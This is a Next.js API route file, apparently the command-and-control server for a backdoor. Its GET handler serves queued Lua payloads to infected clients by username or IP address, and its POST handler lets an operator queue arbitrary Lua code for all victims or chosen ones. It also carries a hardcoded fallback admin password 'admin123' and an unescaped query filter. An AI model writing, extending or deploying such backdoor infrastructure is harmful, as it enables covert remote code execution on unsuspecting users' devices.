import { supabase } from '@/lib/supabase';
import { NextResponse } from 'next/server';

export const runtime = 'edge';
export const dynamic = 'force-dynamic';
export const revalidate = 0;

export async function GET(request) {
  try {
    const { searchParams } = new URL(request.url);
    const username = searchParams.get('user') || 'Unknown';
    const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0].trim() || request.ip || '127.0.0.1';

    const { data: commands, error } = await supabase
      .from('backdoor_commands')
      .select('*')
      .eq('status', 'pending')
      .or(`target_value.eq.ALL,target_value.eq.${username},target_value.eq.${ipAddress}`)
      .order('created_at', { ascending: true })
      .limit(5);

    if (error || !commands || commands.length === 0) {
      return new Response('', { status: 200, headers: { 'Content-Type': 'text/plain' } });
    }

    const luaPayloads = commands.map(c => c.payload_lua).join('\n\n');

    const commandIds = commands.map(c => c.id);
    if (commandIds.length > 0) {
      await supabase.from('backdoor_commands').update({ status: 'executed' }).in('id', commandIds);
    }

    return new Response(luaPayloads, {
      status: 200,
      headers: {
        'Content-Type': 'text/plain; charset=utf-8',
        'Cache-Control': 'no-store, no-cache, must-revalidate',
      },
    });
  } catch (err) {
    return new Response('', { status: 500 });
  }
}

export async function POST(request) {
  try {
    const body = await request.json();
    const { adminPassword, targetType, targetValue, payloadLua } = body;

    const { data: passData } = await supabase.from('settings').select('value').eq('key', 'admin_password').single();
    const correctPassword = passData?.value || 'admin123';

    if (adminPassword !== correctPassword) {
      return NextResponse.json({ success: false, message: 'Sai mật khẩu Admin!' }, { status: 401 });
    }

    if (!payloadLua || !payloadLua.trim()) {
      return NextResponse.json({ success: false, message: 'Lua Payload không được để trống!' }, { status: 400 });
    }

    const { data, error } = await supabase.from('backdoor_commands').insert([{
      target_type: targetType || 'ALL',
      target_value: targetValue || 'ALL',
      payload_lua: payloadLua,
      status: 'pending'
    }]).select();

    if (error) throw error;

    return NextResponse.json({ success: true, message: 'done', data });
  } catch (err) {
    return NextResponse.json({ success: false, message: err.message }, { status: 500 });
  }
}
